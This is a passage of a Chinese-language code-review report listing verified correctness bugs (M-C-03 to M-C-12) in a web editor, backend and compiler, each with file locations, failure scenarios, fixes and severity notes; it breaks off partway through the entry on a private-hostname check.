##### M-C-03 远程项目测试启动时用 JSON.stringify 比较两个排序规则不同的记录,导致合法运行被拒绝

- **位置**: [`apps/web/src/editor/features/testing/projectTestExecutionClient.ts:61`](apps/web/src/editor/features/testing/projectTestExecutionClient.ts#L61)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-execution`

**详情**: `resolveSnapshot` 把 `candidate.workspace.partitionRevisions`(来自 `ExecutionRequest`,其键由 `packages/runtime-core/src/executionRequest.ts:68` 中的 `createExecutionRequest` 用 `left.localeCompare(right)` 排序)与 `snapshot.workspace.partitionRevisions`(来自 `ExecutableProjectSnapshot`,其键由 `packages/runtime-core/src/executableProjectNormalization.ts:690` 中的 `normalizeExecutableProjectWorkspaceRef` 用 `compareExecutableProjectText` 排序,即原始码位的 `<`/`>`)进行比较。`JSON.stringify` 保留插入顺序,因此只要 ICU 排序规则与码位顺序不同,两者的序列化结果就会不同 —— 最明显的就是大小写混合的文档 id。该检查随即抛出,远程测试 provider 永远无法启动。两个记录包含完全相同的条目,只有键的顺序不同,因此这个守卫比较的是序列化顺序,而非同一性。

**失败场景**: 某个 workspace 含有 id 为 `Card` 和 `app-shell` 的文档(文档 id 只要求是去除首尾空白后的非空字符串;导入或手写的 workspace 经常带有大小写混合的 id)。分区键包含 `document:Card:content` 和 `document:app-shell:content`。码位排序把 `document:Card:*` 排在前面('C'=0x43 < 'a'=0x61);而在任何拉丁语言环境下,`localeCompare` 把 `document:app-shell:*` 排在前面('a' < 'c')。用户在 Testing 页面选择 provider `remote` 并点击 Run -> `resolveSnapshot` 抛出 `Remote Test snapshot identity or mock-only policy drifted.` -> `useProjectTestRunner.run` 捕获它并以该消息显示状态 `blocked`。该 workspace 的远程测试永久不可用,而浏览器测试仍然正常。

**修复建议**: 逐条目比较这两个记录(例如键数量相等,再加上 `Object.entries(a).every(([k,v]) => b[k] === v)`),或者在序列化前用同一个比较器对两者做规范化。不要对由两个不同归一化器产生的记录使用 `JSON.stringify` 相等性比较。

**验证备注**: 两个比较器均已核实:createExecutionRequest 用 .sort(([l],[r]) => l.localeCompare(r)) 归一化 partitionRevisions(packages/runtime-core/src/executionRequest.ts:66,在 :143 处应用),而 ExecutableProjectSnapshot 路径使用 compareExecutableProjectText,即原始码位的 `<`/`>`(packages/runtime-core/src/executableProjectNormalization.ts:54,在 :690 处应用)。createProjectTestExecutionPlan 从 project.snapshot.workspace 构建请求(projectTestExecutionPlan.ts:190),因此两个对象携带完全相同的条目,只有插入顺序不同,而 JSON.stringify 会保留该顺序。我在 Node 中用现实的键集复现了这一分歧:不仅是审查者举的大小写混合例子,全小写 id 同样会触发('home-page' 与 'home_page'、'logo_png' 与 'logo1_png'),因为 ICU 把 '_' 排在 '-' 之前、也排在数字之前,而码位顺序并非如此。分区键是由 workspace.docsById 构造出的 workspace/route/document:<id>:content|meta(workspaceExecutableProject.ts:146),而文档 id 会保留大小写、'_'、'-' 和数字(例如 createWorkspaceResourceDocumentId 会从用户文件路径中保留 [a-zA-Z0-9_-])。因此 resolveSnapshot 会在 remoteExecutionProvider.start 内部抛出(packages/runtime-remote/src/remoteExecutionProvider.ts:931),而 useProjectTestRunner.run 会把它捕获为状态 'blocked'。没有任何测试覆盖远程路径(ProjectTestingPage.test.tsx 设置 remoteAvailable:false)。严重度下调为 medium:它会确定性地让可选启用的 Remote Test provider 失效并给出误导性消息,但浏览器 provider 才是默认项,且没有数据被破坏;另外注意 snapshotId 本身已经编码了每个文档 id 与 revision,因此 partitionRevisions 的比较只是额外引入了这个排序 bug。

##### M-C-04 在游标未变的情况下第二次重连流,会被自己造成的 trace 冲突杀死

- **位置**: [`apps/web/src/editor/features/execution/remoteDataStreamRunCoordinator.ts:236`](apps/web/src/editor/features/execution/remoteDataStreamRunCoordinator.ts#L236)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-execution`

**详情**: 每次恢复连接时,`remoteDataStreamGatewayClient` 都会用新的 open 阶段网络 trace 通知 `networkListeners`,而该协调器会以 `traceId: network:${jobId}` / `spanId: network.requestId` / `phase: 'event'` 的形式重新发布它。后端把该 requestId 推导为 `invocationID + ":stream:" + checkpoint.Cursor`(apps/backend/internal/modules/remoteexecution/data_gateway_stream.go:649),因此从*同一个* checkpoint 发起的两次恢复会产生相同的 spanId,但 `startedAt`/`completedAt`/`durationMs` 不同。`executionSessionCoordinator.publishTrace`(packages/runtime-core/src/executionSession.ts:551-563)对同一身份但指纹不同的 trace 返回 `conflict`。`publishNetworkTrace` 把 `conflict` 映射为 `false`,而 `subscribeNetwork` 处理器会把任何 `false` 变成不可重试的 `DATA_REMOTE_GATEWAY_INVALID` 并调用 `terminate(stream)` —— 从而摧毁一条刚刚成功恢复的流。

**失败场景**: 一个 GraphQL/AsyncAPI 订阅已打开但处于空闲状态。游标为 1,`checkpoint = {cursor: 1, token}`。SSE 连接断开 -> `reconnect()` 在游标 1 处恢复,发布 trace `inv:stream:1`(状态 `published`)。没有事件到达;连接再次断开 -> `reconnect()` 用*同一个* checkpoint token 恢复(该 token 经 HMAC/TTL 校验,并非一次性,见 data_gateway_stream.go:502-508)-> 后端再次以新的时间戳发出 requestId `inv:stream:1` -> `publishTrace` 返回 `conflict` -> 监听器向预览帧发布 `{phase:'error', code:'DATA_REMOTE_GATEWAY_INVALID', retryable:false}` 并终止该流,尽管传输层已经重连成功。对于任何在两次断开之间处于空闲的流,重连策略都被静默地击穿了。

**修复建议**: 给恢复后的连接一个独立的 span 身份(例如在 `spanId` 中加入单调递增的本地重连尝试次数),或者把*恢复* trace 上的 `publication.status === 'duplicate' | 'conflict'` 视为非致命(返回 true)而不是终止该流。只有真正的 `session-not-found`/`stale-job` 才应当封锁该流。

**验证备注**: 链条上的每一环都成立。后端把 RequestID 设为 invocationID + ":stream:" + checkpoint.Cursor(apps/backend/internal/modules/remoteexecution/data_gateway_stream.go:649),而恢复 token 经 HMAC + openedAt-TTL 校验,并非一次性(同一文件 :107-139 的 decodeDataGatewayStreamCheckpoint),因此从未变的 checkpoint 发起的第二次恢复会被接受,并产生相同的 requestId 以及全新的 startedAt/completedAt。客户端只在收到携带 `resume` 的事件时才推进 `checkpoint`(remoteDataStreamGatewayClient.ts:641),所以两次断开之间没有事件时会在完全相同的游标处恢复,而 reconnect() 会把 next.network 重新发布给 networkListeners(:553-559)。publishTrace 以 jobId\0traceId\0spanId\0phase 作为身份键,并比较完整的 JSON 指纹(packages/runtime-core/src/executionSession.ts:546-563);toExecutionNetworkTraceValue 包含 startedAt/completedAt/durationMs(executionNetworkTrace.ts:232-234),因此第二次发布返回 'conflict'。publishNetworkTrace 把 conflict 映射为 false(remoteDataStreamRunCoordinator.ts:151),随后 subscribeNetwork 处理器就会对一条刚刚恢复的流发出不可重试的 DATA_REMOTE_GATEWAY_INVALID 并调用 terminate(stream)。现有的协调器测试只覆盖了带有不同 requestId(`${request.requestId}:1`)的续期连接,因此没有任何防护。严重度修正为 medium:它需要 Remote Preview 加上一个流式数据操作,再加上两次连续断开且中间没有任何事件,重连本来也上限为 4 次,后果是丢失一条流而不是状态被破坏。

##### M-C-05 一旦画布已经保存,切换 NodeGraph 文档就会被永久阻塞

- **位置**: [`apps/web/src/editor/features/development/reactflow/useNodeGraphWorkspaceDocumentManager.ts:240`](apps/web/src/editor/features/development/reactflow/useNodeGraphWorkspaceDocumentManager.ts#L240)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-code-anim-graph`

**详情**: `switchGraph` 把 `persistCanvas` 返回的 `false` 当作"保存失败"。但 `persistCanvas` -> `scheduleWorkspaceCommand` 在两种不同情况下都会返回 `false`:真正被拒绝,以及 `factory(...)` 返回 `null`。只要规范内容与画布内容相同,`createWorkspaceNodeGraphDocumentUpdateCommand` 就会返回 `null`(`packages/workspace/src/workspaceNodeGraphDocument.ts:135  if (!forwardOps.length) return null;`)。由于 `NodeGraphEditorContent` 在每次 `nodes`/`edges` 变化时都会自动持久化(NodeGraphEditorContent.tsx:320 的 effect),稳态始终是"画布 == 文档",于是 `persistCanvas` 返回 `false`,切换被拒绝。同一功能中的 `runActiveGraph` 有意*不*依赖这个返回值(它会重新读取 workspace 并比较签名),而 Animation 编辑器中对应的 `scheduleAnimationPersistence` 在内容未变的情况下显式返回 `true`(useAnimationEditorState.ts:107-111)—— 这印证了 `false` 并不是失败信号。

**失败场景**: workspace 中有两个图。用户打开 NodeGraph 编辑器,不做任何编辑(或做了编辑并让自动保存 effect 完成),然后在 `NodeGraphGraphManager` 的 `<select>` 中选择另一个图。由于更新命令工厂对未变更内容返回 `null`,`persistCanvas` 解析为 `false`,`setActiveDocumentId` 从未被调用;受控的 `<select>` 弹回原来的图,并显示提示 "Save the current graph before switching."。用户永远无法通过下拉框切换图。

**修复建议**: 让 `persistCanvas`(或 `scheduleWorkspaceCommand`)区分"无需变更"与"被拒绝"—— 例如返回 `'unchanged' | 'saved' | 'rejected'`,并让 `switchGraph` 在 `unchanged` 和 `saved` 两种情况下都继续,与 `scheduleAnimationPersistence` 的 `existingSignature === nextSignature -> true` 分支保持一致。

**验证备注**: 整条链路已验证:scheduleWorkspaceCommand(NodeGraphEditorContent.tsx:200-232)在被拒绝时以及工厂返回 null 时都返回 false;createWorkspaceNodeGraphDocumentUpdateCommand 在没有正向操作时返回 null(packages/workspace/src/workspaceNodeGraphDocument.ts:135);persistCanvas 只是把那个布尔值透传出去(NodeGraphEditorContent.tsx:248-269)。NodeGraphEditorContent.tsx:320-327 的自动保存 effect,加上稳定的水合往返(toNodeGraphCanvasNodes/toCanonicalNodeGraphDocument 会保留 executor、端口以及 x-prodivix-canvas-layout 字段),使得"画布 == 文档"成为稳态,而未做编辑的情形是确定性的。健康图的 activeGraph.status 为 'valid'(nodeGraphWorkspaceDocuments.ts:36),因此总是走 persistCanvas 分支,而 NodeGraphGraphManager.tsx:64-68 是一个受控的 <select value={activeGraphId}>,在 setActiveDocumentId 未被调用时会弹回原值。不存在生命周期/计划层面的补偿,也没有测试覆盖 switchGraph。这一对比是真实的:useAnimationEditorState.ts:107-111 在未变更时返回 true,而 runActiveGraph 会重新读取 workspace 而不是信任那个布尔值。严重度下调为 medium:图的下拉框功能上失效,但没有任何内容被破坏或丢失,其他界面仍然可以设置活动文档。

##### M-C-06 关键帧行的 React key 包含可变的 `atMs`,导致每次按键都重新挂载时间输入框,并让去重静默销毁一个关键帧

- **位置**: [`apps/web/src/editor/features/animation/panels/AnimationEditorKeyframesEditor.tsx:73`](apps/web/src/editor/features/animation/panels/AnimationEditorKeyframesEditor.tsx#L73)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-code-anim-graph`

**详情**: 列表的 key 嵌入了 `keyframe.atMs`,而这正是该行中受控 `<input type="number">` 所编辑的值。每一次按键都会调用 `onUpdateKeyframeAtMs` -> `updateKeyframeAtMs` -> `normalizeKeyframeRows`,后者会改变 `atMs`,于是 key 发生变化,React 卸载该行并挂载一个新行,处于焦点中的输入框被销毁。`normalizeKeyframeRows`(packages/animation/src/animationAuthoring.ts:30-43)还会通过一个 `Map` 按 `atMs` 去重(后出现的行胜出)并重新排序,因此用户输入过程中的中间值可能与已有关键帧碰撞并把它永久丢弃;排序还会使该行其他回调(`onDeleteKeyframe`、`onUpdateKeyframeValue`)闭包捕获的 `index` 失效。

**失败场景**: 某条轨道有 `atMs: 0`(值 0)和 `atMs: 1000`(值 100)两个关键帧。用户清空第二行的时间字段,并输入 `500` 的第一位数字 `0`。`normalizeKeyframeRows` 把两行都映射到键 `0`;第二行覆盖第一行,只剩下一个关键帧 `{atMs: 0, value: 100}` —— 0 毫秒处的关键帧被静默销毁,并立刻作为一条 Animation 更新命令被持久化。即使没有发生碰撞,输入 `1500` 也是不可能的:输入第一位数字之后,key 就从 `track-1000-1` 变成 `track-1-1`,输入框被重新挂载并失去焦点。

**修复建议**: 用稳定的关键帧身份来做行的 key(增加一个关键帧 id,或退而使用 `${track.id}-${index}`),在回调中按身份而非数组索引来定位关键帧,并把输入的时间保存在本地草稿状态中,只在失焦/回车时提交(并给出明确的碰撞提示),而不是每次按键就提交。

**验证备注**: 关键行在 AnimationEditorKeyframesEditor.tsx:73 处完全吻合,且受控的 <input type="number" value={keyframe.atMs}> 是那个带 key 的 div 的子元素,因此任何改变 atMs 的按键都会改变 key,并强制该 keyed 子元素卸载/挂载(焦点丢失)。updateKeyframeAtMs(useAnimationEditorState.ts:973-997)总是运行 normalizeKeyframeRows,后者会做钳制、通过 Map 按 atMs 去重(后出现的行胜出)并重新排序(packages/animation/src/animationAuthoring.ts:21-43)—— 因此输入一个等于已有关键帧时间的值会静默销毁先前那个关键帧。结果会被自动持久化:useAnimationEditorState.ts:198-209 的 effect 会在每次状态变化时调度一条 Animation 更新命令。该论断有两处夸大:会被钳制回同一 atMs 的按键(例如在超过 durationMs 之后再追加一位数字)不会改变 key;而"闭包捕获的回调中索引陈旧"这一点是错误的,因为 index 在每次渲染时都会重新计算。严重度下调为 medium:丢失的是一个可恢复的关键帧,时间字段实际上不可用,但影响有界、在关键帧列表中可见,并且可通过 workspace 命令历史撤销。

##### M-C-07 资源树重命名 effect 在每次父组件渲染时都重新触发,覆盖已输入的名称并重新打开已取消的重命名

- **位置**: [`apps/web/src/editor/features/resources/ResourceFileTree.tsx:136`](apps/web/src/editor/features/resources/ResourceFileTree.tsx#L136)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: 该 effect 依赖 `onSelect` 和 `tree`。`onSelect` 就是 `handleSelectNode`,它在 `PublicResourcePage` 中内联定义(PublicResourcePage.tsx:278),因此每次父组件渲染都会是一个新函数;`tree` 是基于 `workspaceDocumentsById` 的 memo。只要 `requestRenameNodeId` 被设置,effect 体就是无条件执行的:它会重新选中该节点并调用 `setRenamingNodeId`/`setRenamingValue(targetNode.name)`。而 `requestRenameNodeId` 只会在 `handleRenameNode` 提交成功时被清除(PublicResourcePage.tsx:621),取消时从不清除。

**失败场景**: (a) 用户点击 "new folder",内联编辑器以 `new-folder` 打开,用户输入 `images`;创建文件夹操作的服务端确认(或任何设置/远程 mutation)导致 `PublicResourcePage` 重新渲染,`onSelect` 获得新标识,effect 重新运行并把输入框重置回 `new-folder`,输入的名称丢失。(b) 用户按 Escape 取消重命名:`renamingNodeId` 在本地被清除,但父组件中的 `requestRenameNodeId` 仍然处于设置状态,因此父组件的下一次渲染就会静默地在该节点上重新进入重命名模式。

**修复建议**: 用一个 ref 记录上一次已消费的 `requestRenameNodeId`,在其未变化时提前返回;把 `onSelect`/`tree` 从依赖数组中移除(或用 `useCallback` 包裹 `handleSelectNode`);并添加一个 `onRenameRequestConsumed` 回调,让父组件在取消时也和提交时一样清除 `requestRenameNodeId`。

**验证备注**: 引用的 effect 完全准确(ResourceFileTree.tsx:129-136),并且一旦 `requestRenameNodeId` 被设置,其函数体就是无条件执行的。`onSelect` 就是 `handleSelectNode`,它是在 PublicResourcePage 函数体第 278 行声明的内联箭头函数,因此每次父组件渲染都有新标识,这意味着 effect 会在每次父组件渲染时重新运行并重新执行 `setRenamingValue(targetNode.name)`,丢弃用户输入的内容。内联编辑器打开期间父组件重新渲染是可达的:该页面订阅了 `state.workspace`,而 `applyWorkspaceMutation`(editorStore.workspaceSlice.ts:329)在 outbox 确认/设置采纳/远程 mutation 时总会产生一个新的 snapshot 对象。场景(a)是真实的 —— handleCreateFolder 在 PublicResourcePage.tsx:406 处以名称 'new-folder' 设置 `setRequestRenameNodeId(nodeId)`。场景(b)也是真实的 —— 输入框的 Escape 处理器(ResourceFileTree.tsx:295-298)调用 `cancelRenaming()`,它只清除子组件的 `renamingNodeId`;父组件的 `requestRenameNodeId` 未被触及,因此父组件下一次渲染就会重新进入重命名模式。论断描述中有一处不准确:第 621 行的 `setRequestRenameNodeId(undefined)` 是在 `applyIntent` 之后无条件执行的,而不是'只在提交成功时',但它在取消时仍然不会被执行到,因此该缺陷成立。(CodeFileTree.tsx:122-128 存在同样的不稳定依赖形态。)严重度修正:丢失按键输入并不必要地重新进入重命名,可恢复,没有持久化的破坏。

##### M-C-08 `hasSelectedDescendant` 被硬编码为 false,导致在设计画布上选中后代节点时浮层组件会关闭

- **位置**: [`apps/web/src/pir/pirWebRendererHost.tsx:66`](apps/web/src/pir/pirWebRendererHost.tsx#L66)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-plugins-shell`

**详情**: `projectElement` 是整个仓库中 `AdapterContext.hasSelectedDescendant` 的唯一生产方(grep 确认其余出现位置只有 `renderPolicyResolver.ts:58,74,146` 中的消费方以及两处类型声明)。它始终传入 `false`。`renderPolicyResolver.applyProps` 与 `resolveCanvasInstanceKey` 都依赖它来在用户于浮层内部操作时保持画布上已打开的浮层处于打开状态,因此该分支永久为死代码,只要焦点离开容器节点本身,容器就会收起。`PIRElementProjectionInput` 只携带 `selected`(通过 `isSameLocation` 做精确节点匹配),所以 host 无法还原该值——这个契约字段端到端都未实现。

**失败场景**: 在 Blueprint 设计画布上,用户选中一个 `AntdModal` 节点(`packages/plugin-antd/plugin/contributions/render-policy.json` 中的规则 `antd.modal`,`children: children-only`,`canvasOpen: { prop: 'open', value: true, when: 'selected' }`)。由于 `context.isSelected` 为 true,弹窗打开。随后用户点击已打开弹窗内部的一个 Button:弹窗节点的 `isSelected` 变为 false,而 `hasSelectedDescendant` 仍为 false,于是 `props.open` 回退为创作时的值(false),`resolveCanvasInstanceKey` 从 `'canvas-forced-open'` 翻转为 `'canvas-authored-state'`。弹窗关闭并重新挂载,卸载了用户刚刚选中的子节点——使 Modal/Drawer/Popover/Popconfirm/Dropdown/Tooltip 的子节点在画布上无法编辑。

**修复建议**: 扩展 `PIRElementProjectionInput`,加入被选中位置的祖先链(或由 `PIRNodeProjection` 在遍历 `childIdsById` 时计算出的 `selectionContainsDescendant` 标志),并在此处传入真实值,而不是字面量 `false`。

**验证备注**: 端到端已核实。pirWebRendererHost.tsx:66 传入 hasSelectedDescendant: false 且是唯一生产方(git grep 显示只有消费方 renderPolicyResolver.ts:58,74,146 以及两处类型声明 registry.ts:16、plugin-react-host/hostModule.ts:23)。PIRElementProjectionInput(PIRRenderer.types.ts:39-46)只携带 `selected`,由 PIRElementProjection.tsx:93 处的精确 isSameLocation 匹配计算得出,因此 host 无法还原该值。设计 host 确实在使用:useBlueprintEditorController.ts:197 在 canvasMode === 'design' 时以 'design' 创建它。antd 的浮层规则(render-policy.json:207 等,portal.mode 为 host-overlay,canvasOpen 的 when 为 'selected')因此完全依赖 context.isSelected;绑定的实现 mapAntdRenderProps/wrapAntdOverlayComponent 从不重新计算选中状态,画布侧也不存在任何固定(pinning)机制。于是一旦选中项移动到后代节点,applyProps 就会丢弃 props[canvasOpen.prop],resolveCanvasInstanceKey 翻转为 'canvas-authored-state'(重新挂载)。严重级别从 high 下调为 medium:这是一个未实现的契约字段,降低了浮层子节点(Modal/Drawer/Dropdown/Popover)在画布上的编辑体验;没有任何文档、workspace 或持久化状态被破坏,属性仍可通过树 + Inspector 编辑。

##### M-C-09 Animation 预览使用了不带 registry 的 PIR host,因此任何包含官方插件组件的页面完全渲染不出内容

- **位置**: [`apps/web/src/editor/features/animation/panels/AnimationEditorPreviewCanvas.tsx:232`](apps/web/src/editor/features/animation/panels/AnimationEditorPreviewCanvas.tsx#L232)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-plugins-shell`

**详情**: `pirWebRendererHost` 是不带扩展 registry 的 `createPirWebRendererHost()`,因此 `resolveElement` 只能返回原生 HTML 元素、两个别名以及 `defaultComponentRegistry` 中的条目。`resolvePirRendererHost`(packages/pir-react-renderer/src/host/pirRendererHost.ts:130)把无法解析的元素类型视为*文档级*的阻塞性问题,而不是逐节点回退,因此单个未知类型就会阻塞整份投影。`AnimationEditorPreviewCanvas.tsx:232` 用这个单例来渲染 workspace 自身创作的页面文档,而 Blueprint 画布则通过 `createPirWebRendererHost(createRendererProjectionRegistry(extensions))` 构建了插件感知的 host(useBlueprintEditorController.ts:197)。

**失败场景**: 用户创作了一个包含一个 `AntdButton` 的页面(该插件已安装,并且在 Blueprint 画布上渲染正常),然后打开 Animation 编辑器并选择该页面作为预览目标。`resolvePirRendererHost` 为 `AntdButton` 发出 `elementResolverMissing`,`projection.status` 变为 `blocked`,整个预览区只显示 `No PIR Element host is registered for "AntdButton".`——页面没有任何部分被渲染,因此动画根本无法预览。

**修复建议**: 让 Animation 预览像 Blueprint 控制器那样基于 workspace 扩展 snapshot 构建自己的 host(`createPirWebRendererHost(createRendererProjectionRegistry(useWebExtensionRegistrySnapshot()))`),并把裸的 `pirWebRendererHost` 单例保留给没有插件平台的场景(社区预览)。

**验证备注**: 端到端已核实。pirWebRendererHost.tsx:135 是不带 registry 的 `createPirWebRendererHost()`,因此 `resolveElement` 只能回退到 `defaultComponentRegistry` + HTML_ELEMENTS + 2 个别名。`resolvePirRendererHost`(packages/pir-react-renderer/src/host/pirRendererHost.ts:131-140)对任何无法解析的元素类型都会推入一个 `elementResolverMissing` 问题,并且一旦 `issues.length > 0` 就返回文档级的 `status:'blocked'`(第 156 行)。PIRRenderer.tsx:136-167 随后设置 `runtime = null` 并执行 `if (!runtime) return null;`——整份投影什么都不渲染。AnimationEditorPreviewCanvas.tsx:232 在渲染 `animation.target.documentId`(AnimationEditorContent.tsx:407),即用户自己创作的页面时,传入的是不带 registry 的单例,而 useBlueprintEditorController.ts:195-203 构建的是 `createPirWebRendererHost(createRendererProjectionRegistry(extensions), ...)`。`createRendererProjectionRegistry`(extensionQueryService.tsx:245-257)是插件 `runtimeType`(例如 `AntdButton`,见 packages/plugin-antd/plugin/contributions/render-policy.json)唯一被注册的地方,因此 Animation 预览永远无法解析它们。唯一的叙述瑕疵:该消息是通过 `rendererIssues` 角落浮层呈现的,而非 `projection.status === 'blocked'` 分支——但实质结论(什么都不渲染)是正确的。真正的缺陷点在消费方,而不是共享工厂。

##### M-C-10 发布 component 或 nodegraph 项目总是以 HTTP 500 失败,因为发布解析器只接受 pir-page 文档

- **位置**: [`apps/backend/internal/modules/workspace/module.go:195`](apps/backend/internal/modules/workspace/module.go#L195)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-auth-project-env`

**详情**: `createProjectWorkspaceBootstrap`(apps/backend/internal/modules/workspace/module.go:86,97)为 `component` 项目在 `/components/component.pir.json` 播种一份 `WorkspaceDocumentTypePIRComponent` 文档,为 `nodegraph` 项目在 `/graphs/main.graph.json` 播种一份 `WorkspaceDocumentTypePIRGraph` 文档。而 `ResolveWorkspacePublicationPIR`(module.go:195)只会返回 `Type == WorkspaceDocumentTypePIRPage` 的文档,因此对这两种资源类型它总是返回 `false`,`PublishProjectWorkspace` 随即返回一个裸的 `errors.New("workspace publication requires a PIR page document")`。`HandlePublishProject` 只对 `ErrProjectNotFound` 做了特殊处理,因此这个确定性的、永久性的状况被报告为 500 `API-5001`。`HandleCommunityListProjects` 仍然暴露 `resourceType=component|nodegraph` 过滤器,而它因此永远匹配不到任何内容。

**失败场景**: 用户通过 `POST /api/projects` 并带 `resourceType="component"` 创建一个 component 资源(Web UI 正是这样做的——`apps/web/src/editor/features/newfile/NewResourceModal.tsx`),然后点击发布。`apps/web/src/editor/ProjectHome.tsx:109` 没有任何资源类型判断,于是调用 `POST /api/projects/{id}/publish`。后端对每一个 component 和 nodegraph 项目的每一次尝试都永久返回 `500 {"code":"API-5001","message":"Could not publish project."}`。

**修复建议**: 让 `ResolveWorkspacePublicationPIR` 能够选取对应资源类型自身的发布文档(pir-component / pir-graph),并新增一个类型化哨兵错误(例如 `ErrProjectNotPublishable`),使 `HandlePublishProject` 在 workspace 确实没有可发布文档时返回 422 而不是 500。

**验证备注**: 已核实 createProjectWorkspaceBootstrap(workspace/module.go:86-105)为 component 项目在 /components/component.pir.json 播种 WorkspaceDocumentTypePIRComponent,为 nodegraph 项目在 /graphs/main.graph.json 播种 WorkspaceDocumentTypePIRGraph。ResolveWorkspacePublicationPIR(module.go:195-209)恰好有两个循环,均过滤 document.Type == WorkspaceDocumentTypePIRPage,因此对这两种 bootstrap 都返回 false;PublishProjectWorkspace(module.go:228)随后返回一个裸的 errors.New,而 HandlePublishProject(handlers.go:172-179)无法把它与 ErrProjectNotFound 区分开,于是对一个确定性的、永久性的、客户端触发的状况给出 500 API-5001。客户端可达性已确认:NewResourceModal.tsx 暴露 resourceType 'project'|'component'|'nodegraph',ProjectHome.tsx:37 定义 isValidProject = Boolean(projectId)——发布按钮的 disabled 表达式和 handlePublish 只检查 projectId/isPublic/auth/isPublishing,没有资源类型判断。is_public 只由 PublishWorkspaceProjection(project/store.go:154)设置,因此社区的 resourceType=component|nodegraph 过滤器永远匹配不到任何内容。Medium 是恰当的严重级别:用户可见的永久性失败加上具有误导性的状态码,但没有数据损坏。

##### M-C-11 `toIdentifier` 把不同的 PIR 节点 id 折叠成同一个生成的局部变量名,在导出的应用中产生自引用的 `const`(TDZ ReferenceError)

- **位置**: [`packages/prodivix-compiler/src/react/nodeCompiler.ts:334`](packages/prodivix-compiler/src/react/nodeCompiler.ts#L334)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: `toIdentifier`(第 53 行)把 `[a-zA-Z0-9_$]` 之外的每个字符都替换为 `_`,因此 `hero-card` 和 `hero_card` 都会变成 `hero_card`。该值被不加限定地用作节点数据作用域的生成局部绑定名(`__pdxNodeScope_<id>`,第 235 行)及其数据值(`__pdxNodeData_<id>`,第 334 行),对 slot 作用域同理(`__pdxSlotScope_<nodeId>_<slotMemberId>`,第 449 行)。子节点是用父节点的作用域表达式编译的,因此当一个*祖先*元素与一个*后代*元素都声明了 `data` 且它们的 id 归一化为同一个标识符时,后代的 IIFE 会发出 `const __pdxNodeScope_X = { ...__pdxNodeScope_X, ... }`,其中内层 `const` 会在整个块(包括它自身的初始化器)内遮蔽外层的那一个。PIR 节点 id 是不受约束的字符串(`packages/pir/src/codec/pirCodec.ts` 只调用 `checkString`),而编辑器自身的 id 工厂(`apps/web/.../paletteCreation.ts:145`)同时保留 `-` 和 `_`,因此这种冲突既可能来自普通创作,也可能来自导入/AI 生成的 workspace。

**失败场景**: 一个 PIR 页面,元素节点 `hero-card`(带 `data: { source: {...} }`)包含后代元素节点 `hero_card`(同样带 `data`)。生成的组件中包含 `(() => { const __pdxNodeData_hero_card = ...; const __pdxNodeScope_hero_card = { ...__pdxNodeScope_hero_card, ... }; ... })()`,嵌套在父节点同名的 IIFE 内部。渲染该页面会抛出 `ReferenceError: Cannot access '__pdxNodeScope_hero_card' before initialization`;导出的应用白屏,且没有任何编译期诊断。

**修复建议**: 通过一个保证唯一性的模块级注册表来分配生成的局部变量名(与 `PIRReactImportRegistry.addInternalDefault` 相同的模式),例如 `context.locals.reserve('__pdxNodeScope', node.id)` 在冲突时返回 `__pdxNodeScope_hero_card2`,并对该节点的数据 const、slot 作用域以及集合后缀复用同一次分配。

**验证备注**: 已实测复现。我通过 compileWorkspacePirReactModules 编译了一个页面,其中元素 'hero-card'(带 data)包含元素 'hero_card'(带 data);status 为 'ready',diagnostics 为 [],发出的函数体包含:`(() => { const __pdxNodeData_hero_card = {"a":1}; const __pdxNodeScope_hero_card = { ...__pdxDefinitionScope, ... }; return (<div ...>{(() => { const __pdxNodeData_hero_card = {"b":2}; const __pdxNodeScope_hero_card = { ...__pdxNodeScope_hero_card, dataById: { ...__pdxNodeScope_hero_card.dataById, ... } }; ... })()}</div>); })()`——内层 const 确实是自引用的,与结论完全一致。pirValidator 只要求节点 id 是与其键相匹配的非空字符串(PIR_GRAPH_NODE_ID),因此字符集不受任何约束。严重级别下调:React 预设生成的构建脚本是 `tsc -b && vite build`(export/presets/reactVite.ts:93),因此它表现为 TS2448 类的构建失败,而不是所声称的「白屏且无编译期诊断」(TDZ ReferenceError 只在基于 esbuild 的 dev/preview 中出现)。可达性也比声称的更窄:编辑器的 id 工厂从小写化的类型生成 `<stem>-<index>`(paletteCreation.ts 的 createNodeIdFactory),因此普通创作下的冲突相当牵强;现实来源是导入/AI 生成的 id。真实的代码生成缺陷,medium。

##### M-C-12 `privateHostname` 把所有以 "fc" 或 "fd" 开头的主机名都当作私有 IPv6 地址,从而阻断合法的公网端点

- **位置**: [`packages/prodivix-compiler/src/react/standaloneDataLiveRuntime.ts:615`](packages/prodivix-compiler/src/react/standaloneDataLiveRuntime.ts#L615)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: IPv6 唯一本地地址检查 `normalized.startsWith('fc')` / `startsWith('fd')`(以及 `/^fe[89ab]/`)被直接应用在原始的 `URL.hostname` 上,而没有先确认该主机名是一个 IPv6 字面量。`https://fdic.gov/api` 的 `URL.hostname` 是 DNS 名称 `fdic.gov`,以 `fd` 开头,因此 `privateHostname` 返回 `true`,`httpEndpoint`/`protocolEndpoint` 随即抛出异常。该函数的其余部分正确地把 IPv4 分支置于四段数字检查之后;而 IPv6 分支没有对应的守卫。

